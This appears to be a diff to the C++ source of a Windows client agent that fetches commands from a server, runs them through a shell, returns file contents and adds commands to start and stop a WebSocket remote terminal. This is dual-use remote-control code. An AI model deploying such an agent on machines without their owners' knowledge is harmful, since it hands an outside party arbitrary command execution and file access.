@@ -1,5 +1,6 @@
 #include "commands.h"
 #include "client.h"
+#include "terminal.h"
 #include <windows.h>
 #include <sstream>
 #include <iostream>
@@ -8,6 +9,7 @@
 #include <cstdio>
 #include <fstream>
 #include <sstream>
+#include <utility>
 
 std::vector<CommandInfo> fetchPendingCommands(const Config& cfg) {
     std::vector<CommandInfo> cmds;
@@ -52,26 +54,26 @@ bool ackCommand(const Config& cfg, const std::string& command_id) {
     return httpPost(cfg, endpoint, oss.str(), resp);
 }
 
-bool sendCommandResult(const Config& cfg, const std::string& command_id, const std::string& result, const std::string& error) {
+bool sendCommandResult(const Config& cfg, const std::string& command_id, const std::string& result, const std::string& error, bool resultIsRawJson) {
     std::string endpoint = "/api/commands/result";
     std::ostringstream oss;
     oss << "{\"command_id\":\"" << command_id << "\","
-        << "\"result\":" << (result.empty() ? "null" : "\"" + escapeJson(result) + "\"") << ","
+        << "\"result\":" << (result.empty() ? "null" : (resultIsRawJson ? result : "\"" + escapeJson(result) + "\"")) << ","
         << "\"error\":\"" << escapeJson(error) << "\"}";
     std::string resp;
     return httpPost(cfg, endpoint, oss.str(), resp);
 }
 
-static std::string execCommandCapture(const std::string& cmd) {
+static std::pair<std::string, int> execCommandCapture(const std::string& cmd) {
     std::string output;
     FILE* pipe = _popen(cmd.c_str(), "r");
-    if (!pipe) return "";
+    if (!pipe) return {"", -1};
     char buffer[256];
     while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
         output += buffer;
     }
-    _pclose(pipe);
-    return output;
+    int exitCode = _pclose(pipe);
+    return {output, exitCode};
 }
 
 static std::string base64Encode(const std::vector<unsigned char>& data) {
@@ -103,7 +105,11 @@ void processCommands(const Config& cfg) {
         std::string result;
         std::string error;
         if (cmd.type == "exec") {
-            result = execCommandCapture(cmd.command);
+            auto [output, exitCode] = execCommandCapture(cmd.command);
+            result = output;
+            if (exitCode != 0) {
+                error = "exit code " + std::to_string(exitCode);
+            }
         } else if (cmd.type == "download") {
             if (cmd.path.empty()) {
                 error = "missing path payload";
@@ -121,10 +127,16 @@ void processCommands(const Config& cfg) {
                     result = oss.str();
                 }
             }
+        } else if (cmd.type == "terminal_start") {
+            startTerminalWS(cfg);
+            result = "terminal ws connecting";
+        } else if (cmd.type == "terminal_end") {
+            stopTerminalWS();
+            result = "terminal ws disconnected";
         } else {
             error = "Unsupported command type: " + cmd.type;
         }
-        sendCommandResult(cfg, cmd.id, result, error);
+        sendCommandResult(cfg, cmd.id, result, error, cmd.type == "download");
     }
 }
 
